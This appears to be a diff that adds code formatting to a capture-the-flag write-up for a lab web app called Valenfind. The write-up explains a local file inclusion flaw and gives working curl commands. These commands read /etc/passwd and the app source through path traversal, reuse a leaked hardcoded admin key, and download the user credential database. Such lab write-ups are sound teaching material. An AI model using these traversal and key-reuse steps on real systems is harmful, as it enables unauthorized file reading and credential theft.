@@ -32,6 +32,7 @@ def fetch_layout():
     file_path = os.path.join(os.getcwd(), 'templates', 'components', layout_file)
     with open(file_path, 'r') as f:
         return f.read()
+```
 Here, the layout parameter is directly used to access files, without sanitization → allows reading arbitrary files on the system.
 
 2. Python Server Vulnerabilities
@@ -46,15 +47,17 @@ Unrestricted file read via LFI:
 The /api/fetch_layout route allows reading files outside the intended templates folder.
 
 Database exposure endpoint:
-
+```
 @app.route('/api/admin/export_db')
 With the admin key, anyone could download the full SQLite database containing user credentials and the flag.
-
+```
 🛠 Step-by-Step Solution
 Step 1: Test for LFI
 Fetch a system file to confirm vulnerability:
-
+```
 curl "http://10.49.158.106:5000/api/fetch_layout?layout=../../../../etc/passwd"
+
+```
 ✅ Expected output:
 
 root:x:0:0:root:/root:/bin/bash
@@ -63,6 +66,7 @@ daemon:x:1:1:daemon:/usr/sbin/nologin
 This confirms LFI is present.
 
 Step 2: Fetch Application Source Code
+```
 curl "http://10.49.158.106:5000/api/fetch_layout?layout=../../../../opt/Valenfind/app.py"
 From the code, you can find:
 
@@ -71,12 +75,13 @@ ADMIN_API_KEY = "CUPID_MASTER_KEY_2024_XOXO"
 Database path: cupid.db
 
 Admin export endpoint: /api/admin/export_db
-
+```
 Step 3: Export the Database
 Use the admin key to download the database:
-
+```
 curl -H "X-Valentine-Token: CUPID_MASTER_KEY_2024_XOXO" \
 "http://10.49.158.106:5000/api/admin/export_db" -o valenfind.db
+```
 Step 4: Inspect the Database
 Open the database using SQLite:
 
